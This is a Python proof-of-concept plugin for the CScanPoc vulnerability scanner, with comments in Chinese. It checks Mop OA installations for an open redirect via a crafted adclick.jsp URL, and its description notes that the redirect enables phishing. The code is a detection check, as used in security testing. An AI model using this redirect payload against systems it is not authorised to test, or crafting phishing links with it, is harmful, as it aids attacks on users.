# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Mop_0000'  # 平台漏洞编号
    name = '猫扑跳转'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2010-11-01'  # 漏洞公布时间
    desc = '''
        猫扑OA采用行业领先的云计算技术，基于传统互联网和移动互联网，创新云服务+云终端的应用模式， 为企业用户版提供一账号管理聚合应用服务。
        猫扑跳转漏洞，攻击者可以通过构造恶意链接来跳转到恶意网站对用户进行钓鱼攻击。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=771'  #
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '猫扑OA'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '71ff79f6-0493-46e7-b60c-d389a0d09e38'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/adclick.jsp?p=1602&url=http://baidu.com/robots.txt'
            response = requests.get(vul_url)
            if response.status_code == 200 and 'Baiduspider' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
